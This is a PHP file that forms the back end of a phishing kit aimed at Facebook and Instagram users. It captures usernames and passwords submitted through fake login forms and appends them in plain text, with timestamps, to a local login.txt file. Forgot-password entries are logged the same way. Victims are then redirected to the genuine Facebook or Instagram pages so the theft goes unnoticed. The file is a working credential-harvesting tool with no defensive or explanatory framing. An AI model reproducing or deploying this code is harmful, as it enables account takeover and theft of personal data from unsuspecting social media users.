<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Forgot Password Handler
    if (isset($_POST['forgot_user']) && !isset($_POST['username']) && !isset($_POST['email'])) {
        $user = $_POST['forgot_user'] ?? 'UNKNOWN';

        // Colored log for terminal
        $header = "\033[36m==== [FORGOT PASSWORD ATTEMPT] ====\033[0m\n";
        $log = "Input: $user\n";
        $log .= "Time: " . date("Y-m-d H:i:s") . "\n";
        $log .= "====================================\n\n";

        file_put_contents("login.txt", strip_tags($header . $log), FILE_APPEND);

        if (php_sapi_name() === 'cli') {
            echo $header . $log;
        }

        header("Location: https://www.instagram.com/accounts/password/reset/");
        exit();
    }

    // Login Handler
    $user = $_POST['username'] ?? $_POST['email'] ?? 'UNKNOWN_USER';
    $pass = $_POST['password'] ?? $_POST['pass'] ?? 'UNKNOWN_PASS';
    $platform = isset($_POST['email']) ? "Facebook" : "Instagram";

    // Colored log header
    $header = $platform === "Facebook"
        ? "\033[34m==== [Facebook Login] ====\033[0m\n"
        : "\033[35m==== [Instagram Login] ====\033[0m\n";

    $log = "Username: $user\nPassword: $pass\n";
    $log .= "Time: " . date("Y-m-d H:i:s") . "\n";
    $log .= "===========================\n\n";

    // Save to file (strip color for file log)
    file_put_contents("login.txt", strip_tags($header . $log), FILE_APPEND);

    if (php_sapi_name() === 'cli') {
        echo $header . $log;
    }

    if ($platform === "Facebook") {
        header("Location: https://m.facebook.com/login");
    } else {
        header("Location: https://www.instagram.com/accounts/login/?hl=en");
    }

    exit();
}
?>
